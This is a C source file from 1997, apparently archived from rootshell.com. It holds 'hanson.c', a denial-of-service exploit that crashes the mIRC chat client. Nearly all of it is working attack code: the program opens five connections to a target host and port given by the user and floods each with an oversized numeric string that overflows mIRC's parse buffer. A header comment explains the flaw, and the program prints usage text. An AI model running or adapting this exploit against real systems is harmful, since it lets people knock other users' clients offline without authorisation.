
/* http://www.rootshell.com/ - 12/23/97 */

/*  hanson.c - by myn with help from h2o and watcher *thanks*

    This lil program exploits mIRC's bound sockets, making the client crash

    mIRC can handle a mass influx of data but cannot handle strings of data
    that are parsed internally through mIRC. This program forces mIRC to
    parse incoming data and identify it, the result from the parse
    is larger then mIRC's buffer string size, thus making the
    client crash :).  This will create 5 connections to the bound port and
    then send the string.

    Its like sending double "int" when you only had 1 bit to work with!

    hanson.c is dedicated to all the lil 13 to 16 year old geeks (abyss)
    that are in love with those cute boys..


          myn@efnet
*/
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>


int x, s, i, p, dport;
/* SET STRING HERE */
char *str =
"9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
*
99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999";
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;


int open_sock(int sock, char *server, int port) {
     struct sockaddr_in blah;
     struct hostent *he;
     bzero((char *)&blah,sizeof(blah));
     blah.sin_family=AF_INET;
     blah.sin_addr.s_addr=inet_addr(server);
     blah.sin_port=htons(port);

    if ((he = gethostbyname(server)) != NULL) {
        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
    }
    else {
         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
           perror("gethostbyname()");
           return(-3);
         }
    }

        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
             perror("connect()");
             close(sock);
             return(-4);
        }
        printf("     Connected to [%s:%d].\n",server,port);
        return;
}


void main(int argc, char *argv[]) {
     int t;
     if (argc != 3) {
       printf("hanson.c - myn@efnet\n\n");
       printf("This lil program exploits mIRC's bound sockets, making the client crash\n\n");
       printf("Usage: %s <target> <port>\n",argv[0]);
       exit(0);
     }
     printf("hanson.c - myn@efnet\n\n");
     for (t=0; t<5; t++)
     {
     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        perror("socket()");
        exit(-1);
     }
     p = atoi(argv[2]);
     open_sock(s,argv[1],p);

     printf("     Sending string 1ooo times to %s port %i... \n", argv[1], p);

     for (i=0; i<1000; i++) {
       send(s,str,strlen(str),0x0);
     }
     printf("mmmmb0p.\n");
     }
     close(s);
}

